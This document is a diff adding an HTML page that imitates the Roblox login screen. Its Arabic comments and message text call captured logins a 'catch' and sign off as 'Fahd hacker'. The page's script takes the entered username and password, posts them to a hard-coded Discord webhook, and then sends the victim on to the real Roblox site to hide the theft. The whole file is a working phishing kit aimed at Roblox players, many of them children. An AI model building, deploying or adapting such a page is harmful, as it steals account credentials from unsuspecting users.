@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login to Roblox</title>
+    <style>
+        /* إعدادات الشاشة */
+        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; font-family: "HCo Gotham SSm", "Helvetica Neue", Helvetica, Arial, sans-serif; }
+
+        /* خلفية الألعاب الملونة الرسمية */
+        .background-mosaic {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1;
+            background-image: url('https://images.rbxcdn.com/1a76c0e5a6f87e834316a9a08e6f16f7.jpg');
+            background-size: cover;
+            background-position: center;
+        }
+
+        /* طبقة التعتيم (نفس تصميم روبلوكس الأصلي) */
+        .overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0;
+            background-color: rgb(0, 0, 0);
+        }
+
+        /* حاوية التوسط */
+        .login-wrapper { display: flex; justify-content: center; align-items: center; height: 100%; position: relative; z-index: 1; }
+
+        /* مربع تسجيل الدخول المرتب */
+        .login-box {
+            background-color: #393b3d;
+            padding: 30px 40px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+            width: 380px; text-align: center; color: white;
+        }
+
+        h1 { font-size: 24px; margin-bottom: 20px; font-weight: 500; }
+
+        /* خانات الإدخال */
+        input {
+            width: 100%; height: 42px; padding: 10px; margin-bottom: 12px; border-radius: 4px;
+            border: 1px solid #000; background-color: #f2f2f2; color: #000000; font-size: 16px; box-sizing: border-box;
+        }
+
+        /* زر تسجيل الدخول */
+        .login-btn {
+            width: 100%; height: 40px; background-color: #000000; color: rgb(243, 240, 240);
+            border: none; border-radius: 4px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 10px;
+        }
+
+        .login-btn:hover { background-color: #0074e0; }
+
+        .footer-links { margin-top: 20px; font-size: 14px; }
+        .footer-links a { color: #0084ff; text-decoration: none; }
+
+        .divider { margin: 20px 0; border-top: 1px solid #555; }
+
+        .secondary-btn {
+            width: 100%; height: 40px; background-color: transparent; color: white;
+            border: 1px solid white; border-radius: 4px; margin-bottom: 10px; font-weight: bold; cursor: pointer;
+        }
+
+        .signup-text { margin-top: 20px; font-size: 14px; }
+        .signup-text a { color: #0084ff; text-decoration: none; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+    <div class="background-mosaic"></div>
+    <div class="overlay"></div>
+
+    <div class="login-wrapper">
+        <div class="login-box">
+            <h1>Login to Roblox</h1>
+            
+            <input type="text" id="username" placeholder="Username/Email/Phone">
+            <input type="password" id="password" placeholder="Password">
+            
+            <button class="login-btn" onclick="captureData()">Log In</button>
+            
+            <div class="footer-links"><a href="#">Forgot Password or Username?</a></div>
+            <div class="divider"></div>
+            <button class="secondary-btn">Email Me a One-Time Code</button>
+            <button class="secondary-btn">Quick Sign-In</button>
+            <div class="signup-text">Don't have an account? <a href="#">Sign Up</a></div>
+        </div>
+    </div>
+
+    <script>
+        function captureData() {
+            const user = document.getElementById("username").value;
+            const pass = document.getElementById("password").value;
+            
+            // الويبهوك الجديد اللي أرسلته يا فهد
+            const webhookURL = "https://discord.com/api/webhooks/1488316094254153829/taRUEYnKTViUEwI_rJ_4hDPSQIiIdqFXKKxDfLhOOEKOXiIGFrD_gWWJ8LOBpTWk-11V";
+
+            const payload = {
+                embeds: [{
+                    title: "🚀 صيدة جديدة في سيرفر فهد!",
+                    color: 3066993, // لون أخضر للنجاح
+                    fields: [
+                        { name: "👤 المستخدم", value: `\`${user || "فارغ"}\``, inline: true },
+                        { name: "🔑 كلمة المرور", value: `\`${pass || "فارغ"}\``, inline: true }
+                    ],
+                    footer: { text: "فهد هكر 😎" },
+                    timestamp: new Date()
+                }]
+            };
+
+            fetch(webhookURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            }).then(() => {
+                // بعد الإرسال، يتم تحويل الضحية لموقع روبلوكس الرسمي للتمويه
+                window.location.href = "https://www.roblox.com/home";
+            });
+        }
+    </script>
+
+</body>
+</html>
